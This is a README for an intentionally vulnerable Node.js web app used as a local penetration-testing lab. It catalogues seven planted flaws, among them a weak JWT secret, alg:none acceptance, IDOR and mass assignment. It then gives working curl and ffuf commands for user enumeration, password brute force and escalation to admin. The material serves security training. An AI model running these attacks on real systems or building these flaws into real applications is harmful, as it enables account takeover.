# Vulnerable Web App - Penetration Testing Lab

## Overview
A deliberately vulnerable web application for security training and penetration testing practice.

## Lab Scenario
- **Objective**: Gain admin access to the application
- **Starting Point**: No credentials known (blackbox test)
- **Target Email**: `admin@lab.com` (password unknown)
- **Initial Access**: Use `user@lab.com` as starting point

## Default Credentials (in database)
- Admin: `admin@lab.com` / `K8x#mP2@nL9qR4!vY` — **target account** (strong password - NOT crackable)
- User: `user@lab.com` / `user123` — **starting account** (weak password - crackable)

## Setup on Kali VM

### 1. Install Node.js (if not installed)
```bash
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs
```

### 2. Upload and Install
```bash
# Upload the project folder to Kali, then:
cd vulnerable-app
npm install
```

### 3. Reset Database (Important!)
If you've run this before, delete the old database to reseed:
```bash
rm -f lab.db
```

### 4. Run the Application
```bash
# Development mode
npm start

# Or with PM2 (recommended for persistent running)
npm install -g pm2
pm2 start server.js --name vuln-lab
pm2 save
```

### 5. Access
- Web UI: http://localhost:3000
- Login: http://localhost:3000/login
- Admin Panel: http://localhost:3000/admin

## Important: Registration is DISABLED
Users cannot self-register. You must compromise existing accounts.

## Vulnerabilities Included

| ID | Vulnerability | Endpoint | Description |
|----|--------------|----------|-------------|
| V1 | User Enumeration | POST /api/auth/check-email | Different responses for existing/non-existing emails |
| V2 | No Rate Limiting | POST /api/auth/login | No protection against brute force |
| V3 | Weak JWT Secret | jwt.sign() | Secret is "secret123" - easily crackable |
| V4 | JWT alg:none Bypass | Middleware | Accepts tokens with alg:none |
| V5 | Insecure Password Reset | POST /api/auth/forgot-password | Token is base64(email:timestamp) - predictable |
| V6 | IDOR | GET /api/users/:id | No ownership check on user data access |
| V7 | Mass Assignment | PUT /api/users/update | Accepts any field including 'role' |

## Attack Flow (Correct Path)

```
1. User Enumeration → discover user@lab.com exists
2. Brute Force → crack password of user@lab.com
3. Login → get JWT with role:user
4. Test /api/admin → 403 Forbidden
5. Mass Assignment → PUT /api/users/update with role:admin
6. Access Admin Panel → SUCCESS!
```

See PHASE3_PENTEST_WALKTHROUGH.md for detailed step-by-step guide.

## Quick Test Commands

### 1. User Enumeration
```bash
curl -X POST http://localhost:3000/api/auth/check-email \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@lab.com"}'
# Response: {"exists":true,"message":"Email already registered"}
```

### 2. Brute Force (target user@lab.com)

**Lưu ý**: Admin password là mật khẩu mạnh, ngẫu nhiên - **không thể brute force**. Trong thực tế, tấn công account thường rồi leo thang đặc quyền.

```bash
# Tạo wordlist
cat > ~/test-passwords.txt << EOF
123456
password
admin123
password123
admin@123
letmein
qwerty
test123
EOF

# Brute force user@lab.com (weak password)
ffuf -u http://localhost:3000/api/auth/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"user@lab.com","password":"FUZZ"}' \
  -w ~/test-passwords.txt \
  -fr "Invalid password"
```

### 3. Login (sau khi brute force)
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@lab.com","password":"user123"}'
```

### 4. Privilege Escalation
```bash
curl -X PUT http://localhost:3000/api/users/update \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

### 5. Access Admin Panel
```bash
curl http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer <NEW_TOKEN>"
```

## File Structure
```
vulnerable-app/
├── server.js                      # Main Express server
├── database.js                    # SQLite database & seed data
├── package.json                   # Dependencies
├── README.md                      # Setup guide
├── PHASE3_PENTEST_WALKTHROUGH.md  # Detailed pentest guide
├── routes/
│   ├── auth.js         # Login (no register), password reset
│   ├── users.js        # User CRUD operations (IDOR, mass assignment)
│   └── admin.js        # Admin-only endpoints
├── middleware/
│   └── auth.js         # JWT verification (vulnerable)
└── public/
    ├── index.html
    ├── login.html
    └── admin.html
```

## Stopping the Application
```bash
# If running with PM2
pm2 stop vuln-lab
pm2 delete vuln-lab

# If running with node
# Press Ctrl+C or kill the process
```

## Legal Notice
This application is intentionally vulnerable and should ONLY be used for:
- Authorized penetration testing training
- Security education in controlled environments
- Learning about common web vulnerabilities

Never deploy this to production or public-facing servers.
